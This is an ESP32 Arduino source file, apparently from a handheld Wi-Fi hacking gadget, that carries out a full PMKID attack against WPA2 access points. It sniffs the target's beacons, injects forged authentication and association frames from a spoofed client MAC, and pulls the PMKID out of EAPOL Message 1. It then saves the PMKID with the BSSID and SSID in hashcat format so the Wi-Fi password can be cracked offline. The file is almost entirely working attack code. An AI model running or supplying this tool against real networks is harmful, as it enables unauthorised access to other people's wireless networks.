#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include "SPI.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "PMKIDGrabber.h"
#include "achievements.h"
#include "ui.h"

// --- Settings & Globals ---
#define ATTACK_TIMEOUT   3000

// -- Target Info --
static uint8_t targetBSSID[6];
static uint8_t targetSSID[32];
static uint8_t targetSSIDLen = 0;
static uint8_t targetChannel  = 1;
static bool    targetSet       = false;

// -- Captured Data --
// Double-buffered to avoid race conditions between ISR and main task.
static uint8_t pmkidBuf[2][16];
static uint8_t bssidBuf[2][6];
static volatile uint8_t writeIdx = 0;   // ISR writes to this buffer
static volatile bool    hasNewPMKID = false;

// -- Beacon / RSN state --
static uint8_t beaconRSN[128];
static int     beaconRSNLen = 0;

// -- Sequence counter for injected frames --
static volatile uint16_t seqNum = 0;

// -- Client MAC used for this attack --
static uint8_t clientMAC[6];

// ==========================================
// UTILITY
// ==========================================

static void genClientMAC() {
    for (int i = 0; i < 6; i++) clientMAC[i] = esp_random() & 0xFF;
    clientMAC[0] = (clientMAC[0] & 0xFE) | 0x02; // Locally administered, unicast
}

static inline void setSeqCtrl(uint8_t *frame, uint16_t seq) {
    // Sequence control field: bits[15:4] = sequence number, bits[3:0] = fragment (0)
    frame[22] = (seq << 4) & 0xF0;
    frame[23] = (seq >> 4) & 0xFF;
}

// ==========================================
// EAPOL / RSN PARSING HELPERS
// ==========================================

/*
 * WPA EAPOL-Key frame layout (after the LLC/SNAP 8-byte header):
 *
 *  Offset  Len  Field
 *  0       1    Protocol Version  (should be 1, 2, or 3)
 *  1       1    Packet Type       (3 = EAPOL-Key)
 *  2       2    Packet Body Length
 *  4       1    Key Descriptor Type  (2 = IEEE 802.11 RSN / WPA2)
 *  5       2    Key Information
 *  7       2    Key Length
 *  9       8    Replay Counter
 *  17      32   ANonce
 *  49      16   Key IV (zeroes in Msg-1)
 *  65      8    Key RSC
 *  73      8    Reserved
 *  81      16   Key MIC (zeroes in Msg-1)
 *  97      2    Key Data Length
 *  99      N    Key Data
 *
 * Total fixed header: 99 bytes + Key Data
 */

#define EAPOL_HDR_SIZE          99   // bytes before Key Data
#define EAPOL_KEY_TYPE_OFFSET    4   // Key Descriptor Type
#define EAPOL_KEY_INFO_OFFSET    5   // Key Information (2 bytes)
#define EAPOL_KEY_DATA_LEN_OFF  97   // Key Data Length (2 bytes, big-endian)
#define EAPOL_KEY_DATA_OFF      99   // Start of Key Data

#define KEY_DESC_TYPE_RSN        2   // RSN / WPA2
#define RSN_TAG_ID              48   // 802.11 RSN Information Element tag

/*
 * Extract a PMKID from the EAPOL Message 1 Key Data.
 *
 * Returns true and copies the PMKID into `out` if found.
 *
 * Key Data in Msg-1 contains an RSN IE whose last 20 bytes
 * are the PMKID Count (2) + PMKID List (16 * count).
 * We accept any RSN IE that ends with at least one PMKID.
 */
static bool extractPMKID(const uint8_t *eapolBase, int eapolLen, uint8_t *out) {
    // Validate minimum frame size
    if (eapolLen < EAPOL_HDR_SIZE + 2) return false;

    // Check EAPOL packet type (must be EAPOL-Key = 3)
    if (eapolBase[1] != 3) return false;

    // Check Key Descriptor Type (must be RSN/WPA2 = 2)
    if (eapolBase[EAPOL_KEY_TYPE_OFFSET] != KEY_DESC_TYPE_RSN) return false;

    // Key Information: bit 3 (0-indexed) must be set for Pairwise key
    uint16_t keyInfo = ((uint16_t)eapolBase[EAPOL_KEY_INFO_OFFSET] << 8) |
                                  eapolBase[EAPOL_KEY_INFO_OFFSET + 1];
    if (!(keyInfo & 0x0008)) return false; // Not a pairwise key

    // Key Data Length
    uint16_t keyDataLen = ((uint16_t)eapolBase[EAPOL_KEY_DATA_LEN_OFF] << 8) |
                                     eapolBase[EAPOL_KEY_DATA_LEN_OFF + 1];
    if ((int)(EAPOL_KEY_DATA_OFF + keyDataLen) > eapolLen) return false;
    if (keyDataLen == 0) return false;

    // Walk Key Data IEs looking for RSN tag (48)
    const uint8_t *kd  = eapolBase + EAPOL_KEY_DATA_OFF;
    int remaining = (int)keyDataLen;

    while (remaining >= 2) {
        uint8_t tag  = kd[0];
        uint8_t tlen = kd[1];
        if (2 + tlen > remaining) break;

        if (tag == RSN_TAG_ID) {
            /*
             * RSN IE structure (from tag+len onwards, body starts at kd+2):
             *   2  Version
             *   4  Group Cipher Suite
             *   2  Pairwise Cipher Suite Count
             *   4n Pairwise Cipher Suites
             *   2  AKM Suite Count
             *   4m AKM Suites
             *   2  RSN Capabilities
             *   2  PMKID Count        <-- optional
             *  16k PMKID List         <-- optional
             *
             * Minimum RSN body without PMKIDs = 2+4+2+4+2+4+2 = 20 bytes.
             * PMKID list starts at body offset 20 (after PMKID Count field).
             * So tlen >= 22 means there is at least one PMKID.
             */
            if (tlen >= 22) {
                // PMKID count is 2 bytes at body[20..21]
                const uint8_t *body = kd + 2;
                uint16_t pmkidCount = ((uint16_t)body[20] << 8) | body[21];
                if (pmkidCount >= 1 && tlen >= 22 + 16) {
                    memcpy(out, body + 22, 16);
                    return true;
                }
            }
            // Found RSN IE but no valid PMKID — stop searching
            return false;
        }

        kd        += 2 + tlen;
        remaining -= 2 + tlen;
    }
    return false;
}

// ==========================================
// SNIFFER CALLBACK (ISR — no heap, no Serial)
// ==========================================

void IRAM_ATTR PMKID_wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    if (!targetSet) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *pl = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    uint16_t fc    = pl[0] | (pl[1] << 8);
    uint8_t  ftype = (fc >> 2) & 0x3;
    uint8_t  fsub  = (fc >> 4) & 0xF;

    // ---------------------------------------------------------
    // A. BEACON (8) or PROBE RESPONSE (5) — capture SSID & RSN
    // ---------------------------------------------------------
    if (ftype == 0 && (fsub == 8 || fsub == 5)) {
        if (len < 36) return;
        if (memcmp(pl + 16, targetBSSID, 6) != 0) return;

        int pos = 36;
        while (pos + 2 <= len) {
            uint8_t tag  = pl[pos];
            uint8_t tlen = pl[pos + 1];
            if (pos + 2 + tlen > len) break;

            if (tag == 0 && tlen > 0 && targetSSIDLen == 0) {
                uint8_t l = (tlen > 32) ? 32 : tlen;
                memcpy(targetSSID, pl + pos + 2, l);
                targetSSIDLen = l;
            }
            if (tag == RSN_TAG_ID && tlen < (int)sizeof(beaconRSN) - 2) {
                memcpy(beaconRSN, pl + pos, tlen + 2);
                beaconRSNLen = tlen + 2;
            }
            pos += 2 + tlen;
        }
        return;
    }

    // ---------------------------------------------------------
    // B. DATA FRAME — capture EAPOL Message 1
    // ---------------------------------------------------------
    if (ftype == 2) {
        // To-DS=0, From-DS=1 means source address is at addr3 (pl+16),
        // not addr2. For infrastructure, AP→STA: addr2=BSSID, addr3=SA.
        // A simpler check: sender BSSID is always pl+10 for From-DS frames.
        // We accept frames where the BSSID field (addr2 in From-DS) matches.
        if (memcmp(pl + 10, targetBSSID, 6) != 0) return;

        // 802.11 data header length: QoS adds 2 bytes
        int hdrLen = ((fsub & 0x8) ? 26 : 24);

        // LLC/SNAP: AA AA 03 00 00 00 88 8E
        if (len < hdrLen + 8) return;
        if (pl[hdrLen + 6] != 0x88 || pl[hdrLen + 7] != 0x8E) return;

        // EAPOL base: skip 8-byte LLC/SNAP header
        const uint8_t *eapolBase = pl + hdrLen + 8;
        int eapolLen = len - hdrLen - 8;

        uint8_t tmpPMKID[16];
        if (extractPMKID(eapolBase, eapolLen, tmpPMKID)) {
            if (!hasNewPMKID) { // Only capture once per attack
                memcpy(pmkidBuf[writeIdx], tmpPMKID, 16);
                memcpy(bssidBuf[writeIdx], targetBSSID, 6);
                hasNewPMKID = true;
            }
        }
    }
}

// ==========================================
// FRAME BUILDERS
// ==========================================

static int buildAuthFrame(uint8_t *frame, const uint8_t *apBSSID) {
    // Frame Control: Authentication (0x00B0), no flags
    frame[0] = 0xB0; frame[1] = 0x00;
    // Duration
    frame[2] = 0x00; frame[3] = 0x00;
    // Addr1: DA = AP
    memcpy(frame + 4, apBSSID, 6);
    // Addr2: SA = our client MAC
    memcpy(frame + 10, clientMAC, 6);
    // Addr3: BSSID
    memcpy(frame + 16, apBSSID, 6);
    // Sequence Control — updated per-send
    frame[22] = 0x00; frame[23] = 0x00;
    // Auth Algorithm: Open System (0x0000)
    frame[24] = 0x00; frame[25] = 0x00;
    // Auth Seq: 1
    frame[26] = 0x01; frame[27] = 0x00;
    // Status: Success
    frame[28] = 0x00; frame[29] = 0x00;
    return 30;
}

static int buildAssocFrame(uint8_t *frame, const uint8_t *apBSSID) {
    int p = 0;
    // Frame Control: Association Request (0x0000)
    frame[p++] = 0x00; frame[p++] = 0x00;
    // Duration
    frame[p++] = 0x00; frame[p++] = 0x00;
    // Addr1: DA = AP
    memcpy(frame + p, apBSSID, 6); p += 6;
    // Addr2: SA = client
    memcpy(frame + p, clientMAC, 6); p += 6;
    // Addr3: BSSID
    memcpy(frame + p, apBSSID, 6); p += 6;
    // Sequence Control
    frame[p++] = 0x00; frame[p++] = 0x00;
    // Capability Info: ESS + Privacy
    frame[p++] = 0x11; frame[p++] = 0x04;
    // Listen Interval
    frame[p++] = 0x0A; frame[p++] = 0x00;

    // SSID IE
    frame[p++] = 0x00;
    frame[p++] = targetSSIDLen;
    memcpy(frame + p, targetSSID, targetSSIDLen);
    p += targetSSIDLen;

    // Supported Rates IE (1, 2, 5.5, 11 Mbps — basic set)
    const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    memcpy(frame + p, rates, sizeof(rates)); p += sizeof(rates);

    // RSN IE copied from beacon (triggers PMKID in AP response)
    if (beaconRSNLen > 0) {
        memcpy(frame + p, beaconRSN, beaconRSNLen);
        p += beaconRSNLen;
    }

    return p;
}

// ==========================================
// MAIN ATTACK FUNCTION
// ==========================================

bool runPMKIDAttack(const uint8_t *apBSSID, int channel) {
    // --- Reset all state ---
    targetSet    = false;
    hasNewPMKID  = false;
    beaconRSNLen = 0;
    targetSSIDLen = 0;
    writeIdx     = 0;
    seqNum       = 0;

    memcpy(targetBSSID, apBSSID, 6);
    targetChannel = channel;
    genClientMAC();

    // --- Start sniffer ---
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&PMKID_wifi_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    xSemaphoreGive(wifiMutex);

    // Enable targetSet only AFTER sniffer is running
    targetSet = true;

    // --- Phase 1: Wait for Beacon / Probe Response ---
    logMessage("[PMKID] Waiting for beacon on ch" + String(channel) + "...");
    uint32_t t = millis();
    while (millis() - t < 5000) {
        if (beaconRSNLen > 0 && targetSSIDLen > 0) break;
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (beaconRSNLen == 0 || targetSSIDLen == 0) {
        logMessage("[PMKID] No beacon received. Wrong channel or AP out of range.");
        xSemaphoreTake(wifiMutex, portMAX_DELAY);
        esp_wifi_set_promiscuous(false);
        xSemaphoreGive(wifiMutex);
        return false;
    }
    logMessage("[PMKID] Beacon received. SSID len=" + String(targetSSIDLen) +
               " RSN len=" + String(beaconRSNLen));

    // --- Phase 2: Build frames ---
    uint8_t authFrame[30];
    int authLen = buildAuthFrame(authFrame, apBSSID);

    uint8_t assocFrame[256];
    int assocLen = buildAssocFrame(assocFrame, apBSSID);

    // --- Phase 3: Inject Auth + Assoc, then wait for PMKID ---
    uint32_t start    = millis();
    uint32_t lastSend = 0;
    bool     authSent = false;

    while (millis() - start < ATTACK_TIMEOUT) {
        if (hasNewPMKID) break;

        // Re-send every 400 ms: AUTH first, then ASSOC 60 ms later
        if (millis() - lastSend > 400) {
            lastSend = millis();

            // Auth frame with incrementing sequence number
            setSeqCtrl(authFrame, seqNum++);
            esp_wifi_80211_tx(WIFI_IF_STA, authFrame, authLen, false);
            vTaskDelay(60 / portTICK_PERIOD_MS);

            // Assoc frame
            setSeqCtrl(assocFrame, seqNum++);
            esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, assocLen, false);

            if (!authSent) {
                logMessage("[PMKID] Auth+Assoc sent. Waiting for EAPOL Msg1...");
                authSent = true;
            }
        }

        vTaskDelay(20 / portTICK_PERIOD_MS);
    }

    // --- Stop sniffer ---
    xSemaphoreTake(wifiMutex, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
    xSemaphoreGive(wifiMutex);

    if (!hasNewPMKID) {
        logMessage("[PMKID] Attack timed out. AP may not support PMKID or is rejecting frames.");
        return false;
    }

    // --- Phase 4: Save to FSYS ---
    // Read from the buffer that was written (ISR won't touch it anymore — sniffer is off)
    uint8_t readIdx = writeIdx;

    logMessage("[PMKID] SUCCESS! Saving...");

    char hexPMKID[33];
    for (int i = 0; i < 16; i++) sprintf(hexPMKID + i * 2, "%02X", pmkidBuf[readIdx][i]);
    hexPMKID[32] = '\0';

    // Ensure directory exists — use the same filesystem handle for both checks and writes
    SD_LOCK();
    bool _pmkid_dir_exists = FSYS.exists("/M5Gotchi/pmkid");
    SD_UNLOCK();
    if (!_pmkid_dir_exists) {
        SD_LOCK();
        FSYS.mkdir("/M5Gotchi/pmkid");
        SD_UNLOCK();
    }

    char filename[64];
    snprintf(filename, sizeof(filename), "/pmkid/%02X%02X%02X%02X%02X%02X.txt",
             bssidBuf[readIdx][0], bssidBuf[readIdx][1], bssidBuf[readIdx][2],
             bssidBuf[readIdx][3], bssidBuf[readIdx][4], bssidBuf[readIdx][5]);

    SD_LOCK();
    File f = FSYS.open(filename, FILE_APPEND);
    SD_UNLOCK();
    if (f) {
        // hashcat format: PMKID*BSSID*ClientMAC*SSID(hex)
        char ssidHex[65] = {0};
        for (int i = 0; i < targetSSIDLen; i++)
            sprintf(ssidHex + i * 2, "%02X", targetSSID[i]);

        f.printf("%s*%02X%02X%02X%02X%02X%02X*%02X%02X%02X%02X%02X%02X*%s\n",
            hexPMKID,
            bssidBuf[readIdx][0], bssidBuf[readIdx][1], bssidBuf[readIdx][2],
            bssidBuf[readIdx][3], bssidBuf[readIdx][4], bssidBuf[readIdx][5],
            clientMAC[0], clientMAC[1], clientMAC[2],
            clientMAC[3], clientMAC[4], clientMAC[5],
            ssidHex);
        f.close();
        logMessage("[PMKID] Saved: " + String(filename));
        drawNewAchUnlock(ACH_PMKID_GRABBER);
    } else {
        logMessage("[PMKID] ERROR: Could not open file for writing.");
    }

    hasNewPMKID = false;
    return true;
}

void attackSetup() {}

void attackLoop() {
    // No longer needed — runPMKIDAttack() is self-contained.
    // Kept for build compatibility.
}